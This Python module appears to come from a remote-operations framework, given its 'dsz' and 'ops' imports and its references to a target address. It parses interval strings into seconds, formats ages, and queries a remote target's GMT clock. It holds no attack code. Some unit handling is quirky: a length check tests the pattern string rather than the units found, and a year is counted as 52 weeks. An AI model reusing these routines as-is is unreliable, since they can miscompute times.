
import dsz
import ops, ops.cmd
import datetime
import time
import re
import ops.system.clocks

def parse_interval_string(interval, delimiter='-'):
    numbers = '[0-9]'
    age_types = '[smhdwy]'
    agetypes_re = re.compile(age_types, re.IGNORECASE)
    age_spec = ('(?:%s+%s?)+' % (numbers, age_types))
    agespec_re = re.compile(age_spec, re.IGNORECASE)
    period_re = re.compile(('^%s( *%s *%s?)?$' % (age_spec, delimiter, age_spec)), re.IGNORECASE)
    if (period_re.match(interval) is None):
        return (None, None)
    period_list = agespec_re.findall(interval)
    if (len(period_list) == 1):
        period_list.append(period_list[(-1)])
    if ((len(agetypes_re.findall(period_list[0])) == 0) and (len(agetypes_re.findall(period_list[1])) == 0)):
        period_list[0] = (period_list[0] + 's')
        period_list[1] = (period_list[1] + 's')
    elif (len(agetypes_re.findall(period_list[0])) == 0):
        period_list[0] = (period_list[0] + agetypes_re.findall(period_list[1])[(-1)])
    elif (len(agetypes_re.findall(period_list[1])) == 0):
        period_list[1] = (period_list[1] + agetypes_re.findall(period_list[0])[(-1)])
    if (len(agetypes_re.findall(period_list[0])) == 0):
        age_types_found = agetypes_re.findall(period_list[1])
        if (len(age_types) > 1):
            return (None, None)
        period_list[0] = (period_list[0] + age_types_found[0])
    elif (len(agetypes_re.findall(period_list[1])) == 0):
        age_types_found = agetypes_re.findall(period_list[0])
        if (len(age_types) > 1):
            return (None, None)
        period_list[1] = (period_list[1] + age_types_found[0])
    min_seconds = get_seconds_from_age(period_list[0])
    max_seconds = get_seconds_from_age(period_list[1])
    return (min_seconds, max_seconds)

def _split_value_(interval_string):
    DIGITS = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    if (interval_string[(-1)] in DIGITS):
        unit = None
        value = interval_string
    else:
        unit = interval_string[(-1)]
        value = interval_string[:(-1)]
    return (value, unit)

def get_seconds_from_age(age):
    numbers = '[0-9]'
    age_types = '[smhdwy]'
    agetypes_re = re.compile(age_types, re.IGNORECASE)
    age_spec = ('%s+%s' % (numbers, age_types))
    agespec_re = re.compile(age_spec, re.IGNORECASE)
    found_ages = agespec_re.findall(age)
    total_seconds = 0
    for found_age in found_ages:
        if found_age.endswith('s'):
            total_seconds += int(found_age[:(-1)])
        elif found_age.endswith('m'):
            total_seconds += (int(found_age[:(-1)]) * 60)
        elif found_age.endswith('h'):
            total_seconds += ((int(found_age[:(-1)]) * 60) * 60)
        elif found_age.endswith('d'):
            total_seconds += (((int(found_age[:(-1)]) * 60) * 60) * 24)
        elif found_age.endswith('w'):
            total_seconds += ((((int(found_age[:(-1)]) * 60) * 60) * 24) * 7)
        elif found_age.endswith('y'):
            total_seconds += (((((int(found_age[:(-1)]) * 60) * 60) * 24) * 7) * 52)
    return total_seconds

def get_age_from_seconds(seconds):
    (days, seconds) = divmod(seconds, ((60 * 60) * 24))
    (hours, seconds) = divmod(seconds, (60 * 60))
    (minutes, seconds) = divmod(seconds, 60)
    agestring = ''
    if (days != 0):
        agestring = ('%sd' % days)
    if (hours != 0):
        agestring += ('%sh' % hours)
    if (minutes != 0):
        agestring += ('%sm' % minutes)
    if (seconds != 0):
        agestring += ('%ss' % seconds)
    return agestring

def get_gmttime_from_remote():
    return ops.system.clocks.gmtime()

def get_first_gmttime_from_remote():
    first_time_cmdid = ops.cmd.get_filtered_command_list(goodwords=['time'], cpaddrs=[ops.TARGET_ADDR])[0]
    timeobject = ops.cmd.generatedata(first_time_cmdid)
    timestring = ('%s %s' % (timeobject.timeitem.gmttime.date, timeobject.timeitem.gmttime.time))
    return datetime.datetime(*time.strptime(timestring, '%Y-%m-%d %H:%M:%S')[0:6])

def delta(age):
    return datetime.timedelta(seconds=ops.timehelper.get_seconds_from_age(age))